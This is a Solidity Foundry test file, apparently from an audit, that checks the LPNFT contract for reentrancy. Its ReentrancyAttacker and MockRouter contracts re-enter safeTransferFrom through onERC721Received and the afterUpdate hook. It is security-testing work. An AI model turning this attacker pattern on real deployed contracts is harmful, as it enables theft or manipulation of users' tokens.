// SPDX-License-Identifier: MIT
pragma solidity >=0.8.24;

import "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../../../contracts/hooks-quantamm/LPNFT.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

// MockRouter contract to simulate reentrancy
contract MockRouter is ERC721Holder {
    LPNFT public lpnft;
    bool public firstCall = true;
    uint256 public afterUpdateCalls = 0;

    // Setter to initialize the LPNFT contract address after deployment
    function setLPNFT(address _lpnft) external {
        lpnft = LPNFT(_lpnft);
    }

    // afterUpdate function that attempts reentrancy
    function afterUpdate(address previousOwner, address to, uint256 tokenId) external {
        afterUpdateCalls += 1;
        if (firstCall && address(lpnft) != address(0)) {
            firstCall = false;
            // Attempt reentrancy by calling safeTransferFrom again
            lpnft.safeTransferFrom(to, previousOwner, tokenId);
        }
    }
}

// ReentrancyAttacker contract
contract ReentrancyAttacker is ERC721Holder {
    LPNFT public lpnft;
    uint256 public tokenId;

    constructor(LPNFT _lpnft) {
        lpnft = _lpnft;
    }

    function setTokenId(uint256 _tokenId) public {
        tokenId = _tokenId;
    }

    function attack() public {
        // Use safeTransferFrom to trigger onERC721Received
        lpnft.safeTransferFrom(address(this), address(this), tokenId);
    }

    // New approve function
    function approve(address to, uint256 _tokenId) public {
        lpnft.approve(to, _tokenId);
    }

    // Corrected onERC721Received Function
    function onERC721Received(address operator, address from, uint256 _tokenId, bytes memory data)
        public
        override
        returns (bytes4)
    {
        if (address(lpnft) == msg.sender) {
            // Reentrancy attack: call safeTransferFrom within onERC721Received
            lpnft.safeTransferFrom(address(this), from, _tokenId);
        }
        return this.onERC721Received.selector;
    }
}

// Updated Test Contract
contract LPNFTReentrancyTest is Test {
    LPNFT public lpnft;
    ReentrancyAttacker public attacker;
    MockRouter public mockRouter;

    function setUp() public {
        // Deploy the MockRouter contract
        mockRouter = new MockRouter();

        // Deploy the LPNFT contract with the MockRouter's address as the router
        lpnft = new LPNFT("TestNFT", "TNFT", address(mockRouter));

        // Initialize the MockRouter with the LPNFT's address
        mockRouter.setLPNFT(address(lpnft));

        // Deploy the ReentrancyAttacker
        attacker = new ReentrancyAttacker(lpnft);

        // Mint a token to the attacker using the MockRouter
        vm.prank(address(mockRouter));
        uint256 tokenId = lpnft.mint(address(attacker));

        // Set the tokenId in the attacker contract
        attacker.setTokenId(tokenId);

        // Approve the MockRouter to transfer the attacker's NFT
        vm.prank(address(attacker));
        attacker.approve(address(mockRouter), tokenId);

        // Grant MockRouter persistent approval to manage all of attacker's NFTs
        vm.prank(address(attacker));
        lpnft.setApprovalForAll(address(mockRouter), true);

        // Fund the LPNFT contract (if necessary)
        vm.deal(address(lpnft), 10 ether);
    }

    function testReentrancyInUpdate() public {
        console.log("Attacker balance before attack:", address(attacker).balance);
        console.log("Contract balance before attack:", address(lpnft).balance);

        // Perform the attack
        try attacker.attack() {
            // If the attack doesn't revert, it means reentrancy was successful
            console.log("Reentrancy attack succeeded.");
        } catch Error(string memory reason) {
            console.log("Reentrancy attack failed with reason:", reason);
        } catch {
            console.log("Reentrancy attack failed without reason.");
        }

        console.log("Attacker balance after attack:", address(attacker).balance);
        console.log("Contract balance after attack:", address(lpnft).balance);

        // Assert that afterUpdate was called twice due to reentrancy
        assertEq(mockRouter.afterUpdateCalls(), 2, "afterUpdate should be called twice due to reentrancy");
    }
}
